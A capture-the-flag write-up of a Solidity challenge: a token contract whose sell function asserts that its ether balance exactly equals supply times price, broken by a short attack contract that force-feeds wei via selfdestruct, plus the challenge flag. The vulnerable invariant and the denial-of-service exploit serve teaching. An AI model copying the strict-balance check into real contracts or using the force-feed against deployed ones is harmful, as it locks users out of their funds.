# Challenge 01: Classic one tbh

## Challenge

We are provided with one contract and it's address. 

```solidity
pragma solidity 0.8.17;

contract  hero2303
 {
    mapping (address => uint256) private userBalances;

    uint256 public constant TOKEN_PRICE = 1 ether;
    string public constant name = "UNDIVTOK";
    string public constant symbol = "UDK";
    
    uint8 public constant decimals = 0;

    uint256 public totalSupply;

    function buy(uint256 _amount) external payable {
        require(
            msg.value == _amount * TOKEN_PRICE, 
            "Ether submitted and Token amount to buy mismatch"
        );

        userBalances[msg.sender] += _amount;
        totalSupply += _amount;
    }

    function sell(uint256 _amount) external {
        require(userBalances[msg.sender] >= _amount, "Insufficient balance");

        userBalances[msg.sender] -= _amount;
        totalSupply -= _amount;

        (bool success, ) = msg.sender.call{value: _amount * TOKEN_PRICE}("");
        require(success, "Failed to send Ether");

        assert(getEtherBalance() == totalSupply * TOKEN_PRICE);
    }

    function transfer(address _to, uint256 _amount) external {
        require(_to != address(0), "_to address is not valid");
        require(userBalances[msg.sender] >= _amount, "Insufficient balance");
        
        userBalances[msg.sender] -= _amount;
        userBalances[_to] += _amount;
    }

    function getEtherBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getUserBalance(address _user) external view returns (uint256) {
        return userBalances[_user];
    }
}
```

The goal is to make everyone unabkle from calling the sell function.

## Solution

The solution is pretty easy. The sell function checks for the balance being the exact value of the tokens.

```
assert(getEtherBalance() == totalSupply * TOKEN_PRICE);
```

The contract should be safe from this ever deferring, but the developer forgot that you can always force feed a contract using selfdestruct. I just implemented an easy attack which sent one wei to the contract and was done.

```solidity
pragma solidity 0.8.17;

contract Attack {
    function attack(address payable addr) public payable {
        selfdestruct(addr);
    }
}
```

Flag: Hero{S4m3_aS_USU4L_bUT_S3eN_IRL??!}